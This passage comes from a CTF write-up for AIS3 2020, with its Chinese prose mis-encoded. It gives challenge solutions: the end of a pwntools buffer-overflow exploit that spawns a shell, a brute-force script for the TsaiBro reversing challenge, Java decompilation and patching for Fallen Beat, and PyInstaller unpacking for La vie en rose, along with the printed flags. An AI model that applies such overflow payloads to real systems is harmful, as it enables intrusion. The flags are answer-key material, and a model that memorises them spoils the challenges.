<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x30</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x00400687</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">process</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">process</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">process</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'whoami'</span><span class="p">)</span>
    <span class="n">process</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Failed to pwn the remote machine."</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/images/posts/ais3-2020-writeup/2lIGWqi.jpg" alt="" /></p>

<p>Flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}
</code></pre></div></div>

<h2 id="reverse">Reverse</h2>

<h3 id="-tsaibro-100-pt">ğŸ TsaiBro (100 pt.)</h3>

<p><img src="https://cdn.discordapp.com/attachments/440255677701685283/718451798981214288/ezgif-6-434c4d3244b1.gif" alt="" /></p>

<p>çœ‹èµ·ä¾†ä¹Ÿæ˜¯å»å¹´é¡Œç›®ã€‚åŸ·è¡Œæ™‚ï¼Œç¨‹å¼æœƒè¦æ±‚è¦é…ä¸Šä¸€å€‹ stringï¼Œç„¶å¾Œæœƒå™´å‡ºé€™æ±è¥¿éœ€è¦ä»€éº¼å­—ä¸²ä¾†å°æ‡‰ä½ è¼¸å…¥çš„æ±è¥¿ã€‚</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â¯ ./TsaiBro
./TsaiBro string%

â¯ ./TsaiBro a
Terry...é€†é€†...æ²’æœ‰...å­¸å•...å–®ç´”...åˆ†äº«...å€‹äºº...ç”Ÿæ´»...æ„Ÿè§¸...
ç™¼è²¡...ç™¼è²¡.% 
</code></pre></div></div>

<p>è€Œæ ¹æ“š <code class="language-plaintext highlighter-rouge">TsaiBroSaid</code> è£¡é¢çš„å­—ä¸²ï¼Œæˆ‘å€‘å¿…é ˆå¾—é€éä¸Šé¢çš„æ–¹æ³•é‡çµ„å‡ºæˆ‘å€‘çš„ Flagã€‚é€™æ™‚å€™æˆ‘å€‘å°±å¯ä»¥ç”¨å¾ˆæš´åŠ›çš„æ–¹å¼ç”¨ pwntools å¹«æˆ‘å€‘æˆ³æ¯å€‹ printable ASCII çš„å°æ‡‰å­—ä¸²ã€‚ä¸éå› ç‚ºæ¯çµ„å­—ä¸²éƒ½æ˜¯å…©å€‹<code class="language-plaintext highlighter-rouge">ç™¼è²¡</code>çµ„åœ¨ä¸€èµ·çš„ï¼Œæ‰€ä»¥æˆ‘ç”¨ RegEx æŠŠå®ƒå€‘ä¸€çµ„ä¸€çµ„æ‹†é–‹ã€‚</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pwn</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s">"ç™¼è²¡..ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡......ç™¼è²¡..ç™¼è²¡.....ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡......ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡..ç™¼è²¡.....ç™¼è²¡..ç™¼è²¡....ç™¼è²¡.....ç™¼è²¡.....ç™¼è²¡.ç™¼è²¡........ç™¼è²¡......ç™¼è²¡....ç™¼è²¡........ç™¼è²¡........ç™¼è²¡.....ç™¼è²¡......ç™¼è²¡......ç™¼è²¡.ç™¼è²¡.ç™¼è²¡........ç™¼è²¡......ç™¼è²¡.......ç™¼è²¡........ç™¼è²¡........ç™¼è²¡.....ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡.ç™¼è²¡...ç™¼è²¡......ç™¼è²¡....ç™¼è²¡........ç™¼è²¡.....ç™¼è²¡......ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡...ç™¼è²¡...ç™¼è²¡......ç™¼è²¡....ç™¼è²¡........ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡......ç™¼è²¡......ç™¼è²¡...ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡...ç™¼è²¡..ç™¼è²¡......ç™¼è²¡.ç™¼è²¡......ç™¼è²¡..ç™¼è²¡..ç™¼è²¡....ç™¼è²¡......ç™¼è²¡......ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡...ç™¼è²¡..ç™¼è²¡.....ç™¼è²¡.....ç™¼è²¡.ç™¼è²¡...ç™¼è²¡.ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡......ç™¼è²¡........ç™¼è²¡......ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡...ç™¼è²¡.....ç™¼è²¡..ç™¼è²¡....ç™¼è²¡......ç™¼è²¡......ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡......ç™¼è²¡......ç™¼è²¡...ç™¼è²¡.ç™¼è²¡........ç™¼è²¡.ç™¼è²¡...ç™¼è²¡......ç™¼è²¡....ç™¼è²¡........ç™¼è²¡.....ç™¼è²¡......ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡......ç™¼è²¡........ç™¼è²¡........ç™¼è²¡.....ç™¼è²¡...ç™¼è²¡.....ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡......."</span>

<span class="n">flag_segments</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"ç™¼è²¡\.{1,99}ç™¼è²¡\.{1,99}"</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>

<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">:</span>
    <span class="n">process</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">([</span><span class="s">"./TsaiBro"</span><span class="p">,</span> <span class="n">c</span><span class="p">])</span>
    <span class="n">process</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">secret_chr</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">secret_chr</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">flag_segments</span><span class="p">)):</span>
            <span class="k">if</span> <span class="n">flag_segments</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">secret_chr</span><span class="p">:</span>
                <span class="n">flag_segments</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span>
    <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag_segments</span><span class="p">))</span>
</code></pre></div></div>

<p>Flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}
</code></pre></div></div>

<h3 id="-fallen-beat-144-pt">ğŸ¹ Fallen Beat (144 pt.)</h3>

<p>é€™é¡Œæˆ‘çœ‹åˆ°æ˜¯ Java æª”å°±çŸ¥é“æ˜¯è¦ Decompile å› Java ç„¶å¾Œå†ç¿»çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä»¶äº‹ç•¶ç„¶å°±æ˜¯ <code class="language-plaintext highlighter-rouge">jd</code> ä¸€ä¸‹å›‰ã€‚</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>18:08:22.060 INFO  com.github.kwart.jd.cli.Main - Decompiling .<span class="se">\F</span>allen_Beat.jar
18:08:22.065 INFO  com.github.kwart.jd.output.ZipOutput - ZIP file output will be initialized - Fallen_Beat.src.jar
18:08:22.527 INFO  com.github.kwart.jd.output.ZipOutput - Finished with 15 class file<span class="o">(</span>s<span class="o">)</span> and 1 resource file<span class="o">(</span>s<span class="o">)</span> written.
</code></pre></div></div>

<p>æ¥è‘—å°±æ˜¯æŠŠ IDEA ç¿»å‡ºä¾†ç„¶å¾Œæ…¢æ…¢çœ‹æª”æ¡ˆã€‚ä¸€é–‹å§‹çœ‹åˆ°çš„ Code å…¶å¯¦é‚„æ»¿äº‚çš„ï¼Œä¸éæˆ‘å€‘å¯ä»¥æƒ³æƒ³éŠæˆ²æ§åˆ¶çš„æ±è¥¿å¤§æ¦‚éƒ½æœƒå¡åœ¨å“ªã€‚</p>

<p>è§£é¡Œæ–¹å‘ï¼š</p>

<ul>
  <li>æç¤ºè·Ÿæˆ‘å€‘èªªè¦æŠŠæ‰€æœ‰ Combo æŒ‰å‡ºä¾†ï¼Œé‚£éŠæˆ²æ€éº¼å–å¾—æœ€é«˜ Combo æ˜¯å¤šå°‘ï¼Ÿ
    <ul>
      <li>æ–¹æ³•ä¸€: æŠŠ Max Combo æ›æˆå®¹è¨±çš„æœ€é«˜å€¼</li>
    </ul>
  </li>
  <li>åœ¨ <code class="language-plaintext highlighter-rouge">PanelEnding</code> è£¡é¢ï¼Œæˆ‘å€‘æœ‰æ‰¾åˆ°å– Flag çš„ä¸€æ®µ
    <ul>
      <li>æˆ‘å€‘å¦‚æœçŸ¥é“ Cache æ˜¯ä»€éº¼çš„è©±å°±å¯ä»¥ç›´æ¥æŠŠ Flag å¾ byte[] å™´å‡ºä¾†</li>
      <li>æˆ‘å€‘æ—¢ç„¶æœ‰ Debugger è·Ÿ Code äº†ï¼Œé‚£æˆ‘å€‘ç›´æ¥è®“é‚£å€‹ <code class="language-plaintext highlighter-rouge">if</code> å™´ <code class="language-plaintext highlighter-rouge">true</code> å°±å¥½å•¦</li>
      <li>æ–¹æ³•äºŒï¼šç›´æ¥è·³é <code class="language-plaintext highlighter-rouge">if (t == mc)</code></li>
    </ul>
  </li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">(</span><span class="n">t</span> <span class="o">==</span> <span class="n">mc</span><span class="o">)</span> <span class="o">{</span>
  <span class="k">for</span> <span class="o">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cache</span><span class="o">.</span><span class="na">size</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span>
    <span class="k">this</span><span class="o">.</span><span class="na">flag</span><span class="o">[</span><span class="n">i</span> <span class="o">%</span> <span class="k">this</span><span class="o">.</span><span class="na">flag</span><span class="o">.</span><span class="na">length</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)(</span><span class="k">this</span><span class="o">.</span><span class="na">flag</span><span class="o">[</span><span class="n">i</span> <span class="o">%</span> <span class="k">this</span><span class="o">.</span><span class="na">flag</span><span class="o">.</span><span class="na">length</span><span class="o">]</span> <span class="o">^</span> <span class="o">((</span><span class="nc">Integer</span><span class="o">)</span><span class="n">cache</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span><span class="o">)).</span><span class="na">intValue</span><span class="o">());</span> 
  <span class="nc">String</span> <span class="n">fff</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">flag</span><span class="o">);</span>
  <span class="k">this</span><span class="o">.</span><span class="na">text</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="na">setText</span><span class="o">(</span><span class="nc">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"Flag: %s"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]</span> <span class="o">{</span> <span class="n">fff</span> <span class="o">}));</span>
<span class="o">}</span>
</code></pre></div></div>

<p>éŸ³æ¨‚éƒ¨åˆ†</p>

<ul>
  <li>æ¯æ¬¡éƒ½å¾—ç­‰éŸ³æ¨‚è·‘å®Œï¼Œé‚£æˆ‘å€‘æŠŠç­‰éŸ³æ¨‚é‚£å¹¾è¡Œå»æ‰å°±ä¸ç”¨ç­‰å•¦
    <ul>
      <li><img src="/assets/images/posts/ais3-2020-writeup/5QV9hFp.png" alt="" /></li>
    </ul>
  </li>
</ul>

<p>éŠæˆ²ä¸€é–‹å§‹é¦¬ä¸Šå°±èƒ½å™´ Flag äº†ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/FZTp8ZV.png" alt="" /></p>

<h3 id="-la-vie-en-rose-499-pt">ğŸŒ¹ La vie en rose (499 pt.)</h3>

<p>é€™æ˜¯æˆ‘é€™æ¬¡ AIS3 èŠ±æœ€ä¹…çš„ä¸€é¡Œï¼Œä¹Ÿæ˜¯æˆ‘è¦ºå¾—æœ€å˜”çš„ä¸€é¡Œï¼Œå› ç‚ºæˆ‘æ‘¸å‡ºä¾†ä¹‹å¾Œçœ‹ä¸å‡ºæ€éº¼è§£å¥½ä¸€æ®µæ™‚é–“ï¼Œè€Œä¸”æ˜¯ç”¨æœ€æš´åŠ›çš„æ–¹å¼è§£ã€‚</p>

<p>é¦–å…ˆï¼Œæˆ‘å€‘ä¸€çœ‹å°±çŸ¥é“æœ¬é¡Œæ‰€é™„çš„ exe æª”æ˜¯æŸç¨® Python ç·¨è­¯è€Œæˆçš„æª”æ¡ˆã€‚æ€éº¼çœ‹å¾—ï¼Ÿæˆ‘å€‘é¦–å…ˆå¯ä»¥çœ‹å®ƒçš„ iconï¼Œå¾ˆæ˜é¡¯å°±æ˜¯ Python çš„ Logo è¡ç”Ÿå‡ºä¾†çš„ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/ZJ2Proq.png" alt="" /></p>

<p>å¦‚æœé€™æ¨£é‚„ä¸å¤ çš„è©±ï¼Œæˆ‘å€‘å¯ä»¥å¾é€™æ±è¥¿åŸ·è¡Œæ™‚çš„ memory references ä¾†çœ‹é€™æ±è¥¿ç›®å‰æœ‰é–‹å“ªäº› handlesã€‚åœ¨é€™äº› handles è£¡é¢ï¼Œå±¢æ¬¡æåˆ° <code class="language-plaintext highlighter-rouge">python38.dll</code>ï¼Œæ‰€ä»¥å¾ˆæ˜é¡¯æœ‰ç”¨åˆ° Python 3.8 çš„ runtimeã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/2ef1IqO.png" alt="" /></p>

<p>é‚£æˆ‘å€‘åœ¨çŸ¥é“é€™é»å¾Œå°±å¯ä»¥é–‹å§‹æ‰¾æ‰¾è§£åŒ…çš„è…³æœ¬/ç¨‹å¼ï¼Œè€Œæœ‰å¯« Python è…³æœ¬æœ‰æƒ³éæ‰“åŒ…çš„äººéƒ½çŸ¥é“ PyInstaller å¯ä»¥åšåˆ°é€™å›äº‹ï¼Œæ‰€ä»¥æ‰¾ä¸€ä¸‹ç›¸é—œé—œéµå­—å°±å¯ä»¥æ‰¾åˆ°åæ‰“åŒ…çš„æ±è¥¿ã€‚æˆ‘å€‹äººæ˜¯ä½¿ç”¨ <a href="https://github.com/extremecoders-re/pyinstxtractor/">pyinstxtractor</a> å°‡ç›¸é—œæª”æ¡ˆæ‹‰å‡ºä¾†ã€‚</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â¯ py <span class="nt">-3</span> .<span class="se">\p</span>yinstxtractor.py La_vie_en_rose.exe
<span class="o">[</span>+] Processing La_vie_en_rose.exe
<span class="o">[</span>+] Pyinstaller version: 2.1+
<span class="o">[</span>+] Python version: 38
<span class="o">[</span>+] Length of package: 9518557 bytes
<span class="o">[</span>+] Found 955 files <span class="k">in </span>CArchive
<span class="o">[</span>+] Beginning extraction...please standby
<span class="o">[</span>+] Possible entry point: pyiboot01_bootstrap.pyc
<span class="o">[</span>+] Possible entry point: pyi_rth__tkinter.pyc
<span class="o">[</span>+] Possible entry point: pyi_rth_multiprocessing.pyc
<span class="o">[</span>+] Possible entry point: rose.pyc
<span class="o">[</span>+] Found 258 files <span class="k">in </span>PYZ archive
<span class="o">[</span>+] Successfully extracted pyinstaller archive: La_vie_en_rose.exe
</code></pre></div></div>

<p>é€™æ™‚å€™å°±å¯ä»¥æ‰¾åˆ°æˆ‘å€‘æœ€ä¸»è¦æƒ³æ”»æ“Šçš„ <code class="language-plaintext highlighter-rouge">rose.pyc</code>ã€‚
<img src="/assets/images/posts/ais3-2020-writeup/ul6QnAx.png" alt="" /></p>

<p>å•é¡Œä¾†äº†ï¼<code class="language-plaintext highlighter-rouge">pyc</code> åŸºæœ¬ä¸Šæ˜¯ Python éƒ½å·²ç¶“ç·¨è­¯æˆ bytecode äº†ï¼Œç„¶å¾Œæˆ‘ä¸è«–è©¦ <code class="language-plaintext highlighter-rouge">uncompyle6</code>, <code class="language-plaintext highlighter-rouge">decompyle3</code>, <code class="language-plaintext highlighter-rouge">pycdc</code> éƒ½ç„¡æ³•æ¨å›åˆ°åŸä¾†çš„ Python æª”ã€‚æˆ‘ç›¸ä¿¡åŸä½œè€…çš„ç”¨æ„æ˜¯è¦æˆ‘å€‘å»ä¿® <code class="language-plaintext highlighter-rouge">rose.pyc</code> çš„ byte æŠŠæœ‰å•é¡Œçš„ä¿®æ­£å›æ­£ç¢ºçš„ã€‚</p>

<p>ä½†æˆ‘ç•¶æ™‚æ€éº¼è©¦éƒ½æ²’è¾¦æ³•ï¼Œæ‰€ä»¥æˆ‘æ±ºå®šåšäº†ä»¶å¾ˆè ¢çš„äº‹ï¼é‡é ­ä¾ <code class="language-plaintext highlighter-rouge">pycdas</code> æ‰€å»ºç«‹å‡ºä¾†çš„ Python disassembly bytecode æ¨å›å» Python æª”ã€‚é€™å€‹éƒ¨åˆ†èµ·ç¢¼èŠ±äº†æˆ‘å¥½å¹¾å€‹å°æ™‚ï¼Œä¸€ç›´è©¦ Code ç„¶å¾Œå‘¼å« python <code class="language-plaintext highlighter-rouge">dis</code> æ¯”è¼ƒ bytecodeé‚„æœ‰ç¿»<a href="https://docs.python.org/3/library/dis.html">å®˜æ–¹ bytecode æŠ€è¡“æ–‡ä»¶</a>ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/i48c924.png" alt="" /></p>

<p><img src="/assets/images/posts/ais3-2020-writeup/OjlxVSg.png" alt="" /></p>

<p>æ–¼æ˜¯ä¹ï¼Œæˆ‘æœ€å¾Œæ¨å‡ºäº†æœ€é—œéµçš„å¹¾è¡Œ codeï¼š</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">dis</span>
<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span><span class="p">,</span> <span class="n">product</span>

<span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
    <span class="n">chars</span> <span class="o">=</span> <span class="p">(</span><span class="s">'a'</span><span class="p">,</span><span class="s">'w'</span><span class="p">,</span> <span class="s">'s'</span><span class="p">,</span> <span class="s">'e'</span><span class="p">,</span> <span class="s">'d'</span><span class="p">,</span> <span class="s">'f'</span><span class="p">,</span> <span class="s">'t'</span><span class="p">,</span> <span class="s">'g'</span><span class="p">,</span> <span class="s">'y'</span><span class="p">,</span> <span class="s">'h'</span><span class="p">,</span> <span class="s">'u'</span><span class="p">,</span><span class="s">'j'</span><span class="p">,</span> <span class="s">'k'</span><span class="p">,</span> <span class="s">'o'</span><span class="p">,</span> <span class="s">'l'</span><span class="p">,</span> <span class="s">'p'</span><span class="p">,</span> <span class="s">';'</span><span class="p">,</span> <span class="s">"'"</span><span class="p">,</span> <span class="s">'['</span><span class="p">,</span> <span class="s">']'</span><span class="p">,</span> <span class="s">' '</span><span class="p">)</span>
    <span class="n">constraints</span> <span class="o">=</span> <span class="p">[</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">202</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">202</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">202</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">217</span><span class="p">,</span><span class="mi">212</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">212</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">136</span><span class="p">,</span><span class="mi">140</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">202</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">217</span><span class="p">,</span><span class="mi">217</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">182</span><span class="p">,</span><span class="mi">199</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">212</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">149</span><span class="p">,</span><span class="mi">149</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">217</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">182</span><span class="p">,</span><span class="mi">199</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">211</span><span class="p">,</span><span class="mi">206</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="o">-</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="o">-</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="o">-</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="o">-</span><span class="mi">76</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="o">-</span><span class="mi">49</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span 